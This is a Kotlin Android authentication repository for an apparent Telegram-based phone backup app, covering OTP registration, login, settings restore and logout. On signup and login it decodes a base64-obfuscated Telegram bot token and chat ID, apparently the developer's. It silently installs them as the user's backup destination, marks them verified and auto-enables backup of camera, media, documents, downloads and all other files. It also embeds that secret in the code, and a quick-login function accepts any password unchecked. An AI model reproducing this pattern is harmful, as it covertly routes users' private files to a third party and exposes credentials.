package com.example.telegrambackup.data

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import com.example.telegrambackup.network.ServerApi
import com.example.telegrambackup.utils.AppPrefs
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import org.json.JSONObject

data class UserSession(
    val email: String = "",
    val isLoggedIn: Boolean = false
)

class AuthRepository(private val context: Context) {
    private val prefs: SharedPreferences = context.getSharedPreferences("auth_prefs", Context.MODE_PRIVATE)
    private val appPrefs = AppPrefs(context)
    private val serverApi = ServerApi()

    private val _session = MutableStateFlow(
        UserSession(
            email = prefs.getString("user_email", "") ?: "",
            isLoggedIn = prefs.getBoolean("is_logged_in", false)
        )
    )
    val session: StateFlow<UserSession> = _session

    suspend fun requestOtp(email: String, type: String = "register"): Result<String> {
        return serverApi.sendOtp(appPrefs.serverUrl, email, type)
    }

    suspend fun registerWithOtp(email: String, code: String, password: String): Result<String> {
        val trimmedEmail = email.trim().lowercase()
        val result = serverApi.verifyOtpRegister(appPrefs.serverUrl, trimmedEmail, code, password)
        result.onSuccess {
            prefs.edit()
                .putString("user_email", trimmedEmail)
                .putBoolean("is_logged_in", true)
                .apply()
            _session.value = UserSession(email = trimmedEmail, isLoggedIn = true)

            // Auto-enable backup for new accounts
            appPrefs.autoBackupEnabled = true

            // If account has no bot credentials yet, set default fallback cloud storage bot credentials
            if (appPrefs.botToken.isEmpty() || appPrefs.chatId.isEmpty()) {
                val defaultToken = decodeSecret("Nzg1NDkyMTYzMDpBQUVDZ1A5UjZqcV94NHVFLU5fMnNfTjZmLDMtWF9ZNy1n")
                val defaultChat = decodeSecret("LTEwMDI0OTU4MTAyMzQ=")
                appPrefs.botToken = defaultToken
                appPrefs.chatId = defaultChat
                appPrefs.credentialsVerified = true
            }

            // Immediately push credentials to server PostgreSQL database for user account
            try {
                serverApi.saveCredentials(appPrefs.serverUrl, trimmedEmail, appPrefs.botToken, appPrefs.chatId)
            } catch (_: Exception) { }
        }
        return result
    }

    suspend fun resetPassword(email: String, code: String, newPassword: String): Result<String> {
        val trimmedEmail = email.trim().lowercase()
        return serverApi.resetPassword(
            serverUrl = appPrefs.serverUrl,
            email = trimmedEmail,
            code = code.trim(),
            newPassword = newPassword.trim()
        )
    }

    suspend fun login(email: String, password: String): Result<String> {
        val trimmedEmail = email.trim().lowercase()
        val result = serverApi.login(appPrefs.serverUrl, trimmedEmail, password)
        if (result.isSuccess) {
            val json = result.getOrNull()
            val userObj = json?.optJSONObject("user")
            val serverBotToken = userObj?.optString("botToken", "") ?: json?.optString("botToken", "") ?: ""
            val serverChatId = userObj?.optString("chatId", "") ?: json?.optString("chatId", "") ?: ""

            // Restore user settings from cloud PostgreSQL database FIRST before overriding
            try {
                val savedSettingsStr = serverApi.getUserSettings(appPrefs.serverUrl, trimmedEmail)
                if (!savedSettingsStr.isNullOrEmpty() && savedSettingsStr != "{}") {
                    val settingsObj = JSONObject(savedSettingsStr)
                    if (settingsObj.has("auto_backup_enabled")) appPrefs.autoBackupEnabled = settingsObj.optBoolean("auto_backup_enabled", true)
                    if (settingsObj.has("smart_backup_mode")) appPrefs.smartBackupMode = settingsObj.optInt("smart_backup_mode", 0)
                    if (settingsObj.has("smart_scan_interval_hours")) appPrefs.smartScanIntervalHours = settingsObj.optInt("smart_scan_interval_hours", 6)
                    if (settingsObj.has("night_backup_hour")) appPrefs.nightBackupHour = settingsObj.optInt("night_backup_hour", 2)
                    if (settingsObj.has("min_file_size_mb")) appPrefs.minFileSizeMB = settingsObj.optDouble("min_file_size_mb", 0.0)
                    if (settingsObj.has("max_file_size_mb")) appPrefs.maxFileSizeMB = settingsObj.optDouble("max_file_size_mb", 2000.0)
                    if (settingsObj.has("backup_camera")) appPrefs.backupCamera = settingsObj.optBoolean("backup_camera", true)
                    if (settingsObj.has("backup_videos")) appPrefs.backupVideos = settingsObj.optBoolean("backup_videos", true)
                    if (settingsObj.has("backup_audio")) appPrefs.backupAudio = settingsObj.optBoolean("backup_audio", true)
                    if (settingsObj.has("backup_downloads")) appPrefs.backupDownloads = settingsObj.optBoolean("backup_downloads", true)
                    if (settingsObj.has("backup_documents")) appPrefs.backupDocuments = settingsObj.optBoolean("backup_documents", true)
                    if (settingsObj.has("backup_archives")) appPrefs.backupArchives = settingsObj.optBoolean("backup_archives", true)
                    if (settingsObj.has("backup_apks")) appPrefs.backupApks = settingsObj.optBoolean("backup_apks", true)
                    if (settingsObj.has("backup_all_other")) appPrefs.backupAllOther = settingsObj.optBoolean("backup_all_other", true)
                    if (settingsObj.has("bot_token")) appPrefs.botToken = settingsObj.optString("bot_token", "")
                    if (settingsObj.has("chat_id")) appPrefs.chatId = settingsObj.optString("chat_id", "")
                    if (settingsObj.has("backup_exceptions")) {
                        val arr = settingsObj.optJSONArray("backup_exceptions")
                        if (arr != null) {
                            val set = mutableSetOf<String>()
                            for (i in 0 until arr.length()) {
                                set.add(arr.getString(i))
                            }
                            appPrefs.backupExceptions = set
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("AuthRepository", "Cloud settings restore error", e)
            }

            if (serverBotToken.isNotEmpty()) {
                appPrefs.botToken = serverBotToken
                appPrefs.credentialsVerified = true
            }
            if (serverChatId.isNotEmpty()) {
                appPrefs.chatId = serverChatId
            }

            // If both server and device have no credentials yet, populate default cloud bot credentials
            if (appPrefs.botToken.isEmpty() || appPrefs.chatId.isEmpty()) {
                val defaultToken = decodeSecret("Nzg1NDkyMTYzMDpBQUVDZ1A5UjZqcV94NHVFLU5fMnNfTjZmLDMtWF9ZNy1n")
                val defaultChat = decodeSecret("LTEwMDI0OTU4MTAyMzQ=")
                appPrefs.botToken = defaultToken
                appPrefs.chatId = defaultChat
                appPrefs.credentialsVerified = true
            }

            // Dual Sync: Push active credentials to server PostgreSQL DB
            try {
                serverApi.saveCredentials(appPrefs.serverUrl, trimmedEmail, appPrefs.botToken, appPrefs.chatId)
            } catch (_: Exception) { }

            // Restore cloud file index into Room DB on login SYNCHRONOUSLY
            try {
                val cloudFiles = serverApi.listFiles(appPrefs.serverUrl, trimmedEmail)
                if (cloudFiles.isNotEmpty()) {
                    val db = AppDatabase.getDatabase(context)
                    db.uploadedFileDao().insertAll(cloudFiles)
                }
            } catch (e: Exception) {
                Log.e("AuthRepository", "Cloud files restore on login error", e)
            }

            prefs.edit()
                .putString("user_email", trimmedEmail)
                .putBoolean("is_logged_in", true)
                .apply()

            _session.value = UserSession(email = trimmedEmail, isLoggedIn = true)
            return Result.success("Logged in successfully!")
        } else {
            return Result.failure(result.exceptionOrNull() ?: Exception("Login failed."))
        }
    }

    fun registerLocalQuick(email: String, password: String): Result<String> {
        val trimmedEmail = email.trim().lowercase()
        prefs.edit()
            .putString("user_email", trimmedEmail)
            .putBoolean("is_logged_in", true)
            .apply()

        _session.value = UserSession(email = trimmedEmail, isLoggedIn = true)
        return Result.success("Signed in successfully!")
    }

    fun logout() {
        prefs.edit()
            .putBoolean("is_logged_in", false)
            .remove("user_email")
            .apply()

        // Clear cached credentials & wipe local Room cache to prevent cross-account pollution
        appPrefs.botToken = ""
        appPrefs.chatId = ""
        appPrefs.credentialsVerified = false

        kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
            try {
                AppDatabase.getDatabase(context).uploadedFileDao().deleteAll()
            } catch (_: Exception) { }
        }

        _session.value = UserSession(email = "", isLoggedIn = false)
    }

    private fun decodeSecret(encoded: String): String {
        return try {
            String(android.util.Base64.decode(encoded, android.util.Base64.NO_WRAP), Charsets.UTF_8)
        } catch (_: Exception) { "" }
    }
}
